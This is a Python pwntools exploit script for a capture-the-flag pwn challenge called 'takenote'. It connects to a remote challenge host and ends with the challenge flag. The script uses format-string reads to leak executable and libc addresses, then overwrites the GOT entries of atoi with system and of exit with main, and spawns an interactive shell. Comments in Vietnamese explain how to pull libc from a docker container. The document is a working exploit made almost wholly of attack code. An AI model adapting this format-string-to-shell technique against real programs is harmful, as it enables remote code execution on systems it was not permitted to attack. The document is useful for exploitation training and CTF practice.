#!/usr/bin/env python3

from pwn import *

exe = ELF('chal_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()
ra = lambda : p.recvall()
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*run+88
        b*run+224
        b*run+619
        c
        ''')
        input()
        # p = gdb.debug([exe.path],"""
        #     b*
        #     c
        #     """)
        # return p


if args.REMOTE:
    p = remote('takenote.kctf-453514-codelab.kctf.cloud',1337)
else:
    p = process([exe.path])
GDB()

#Leak address
#exe = 19
#libc = 23
sla(b'write?\n\n',b'5')
sla(b'3. Exit\n\n',b'1')
sla(b'to? [0 - 4]\n',b'0')
sl(f'%19$p%23$p'.encode())
sla(b'3. Exit\n\n',b'2')
sla(b'print?\n\n',b'0')
ru(b'reads:\n\n')
data = ru(b'\n').split(b'0x')
exe_leak = int(data[1],16)
libc_leak = int(data[2],16)
info("Leak address:")
info("Exe leak: "+hex(exe_leak))
info("Libc leak: "+hex(libc_leak))
info("Base address:")
exe.address = exe_leak - 0x158b
libc.address = libc_leak - 0x24083
info("Exe base: "+hex(exe.address))
info("Libc base: "+hex(libc.address))

#Shell
s1 = libc.sym.system & 0xff
s2 = libc.sym.system >> 8 & 0xffff
print(hex(s1))
print(hex(s2))

p0 = f'%{s1}c%14$hhn'.encode()
p0 = p0.ljust(0x10)
p0 += p64(exe.got.atoi)
sla(b'3. Exit\n\n',b'1')
sla(b'to? [0 - 4]\n',b'0')
sl(p0)
sla(b'3. Exit\n\n',b'2')
sla(b'print?\n\n',b'0')

p1 = f'%{s2}c%14$hn'.encode()
p1 = p1.ljust(0x10)
p1 += p64(exe.got.atoi+1)
sla(b'3. Exit\n\n',b'1')
sla(b'to? [0 - 4]\n',b'0')
sl(p1)
sla(b'3. Exit\n\n',b'2')
sla(b'print?\n\n',b'0')

smain = exe.sym.main & 0xffff
p2 = f'%{smain}c%14$hn'.encode()
p2 = p2.ljust(0x10)
p2 += p64(exe.got.exit)
sla(b'3. Exit\n\n',b'1')
sla(b'to? [0 - 4]\n',b'0')
sl(p2)
sla(b'3. Exit\n\n',b'2')
sla(b'print?\n\n',b'0')

sla(b'3. Exit\n\n',b'3')
sla(b'write?\n\n',b'sh')
p.interactive()
# Cách lấy libc
# sudo docker run -it <version docker> sh
# find / -name "libc.so.6" 2>/dev/null
# sudo docker cp <container_id>:/<file_path> ./<file>
# (sudo docker cp d04339210cc0://usr/lib/x86_64-linux-gnu/ld-2.31.so ./ld-2.31.so)
# (sudo docker cp d04339210cc0://usr/lib/x86_64-linux-gnu/libc-2.31.so ./libc-2.31.so)

#wctf{m3m0ry_l4y0u7_1s_crUc1Al_f0r_3xpL01t5}